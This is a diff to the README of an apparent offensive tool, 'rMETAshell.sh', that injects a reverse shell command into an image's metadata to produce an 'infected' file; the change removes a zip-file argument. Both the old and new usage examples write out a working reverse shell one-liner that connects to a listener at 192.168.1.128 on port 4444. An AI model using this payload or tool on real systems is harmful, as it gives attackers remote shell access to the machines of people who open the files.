@@ -59,18 +59,17 @@ Text Formats: TXT, CSV, XML, and more.
 ## Usage
 
 ```
-./rMETAshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <FILENAME> <ZIP>
+./rMETAshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <FILENAME>
 ```
 
 - `[OPTIONS]` - Optional arguments.
 - `<REVERSE_SHELL_COMMAND>` - The reverse shell command to inject.
 - `<FILENAME>` - The name of the media file.
-- `<ZIP>` -The name of the zip file where the infected file is stored.
 
 **Example:**
 
 ```
-./rMETAshell.sh "/bin/sh -i >& /dev/tcp/192.168.1.128/4444 0>&1" image.jpg test.zip
+./rMETAshell.sh "/bin/sh -i >& /dev/tcp/192.168.1.128/4444 0>&1" image.jpg
 ```
 
 Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rMETAshell.
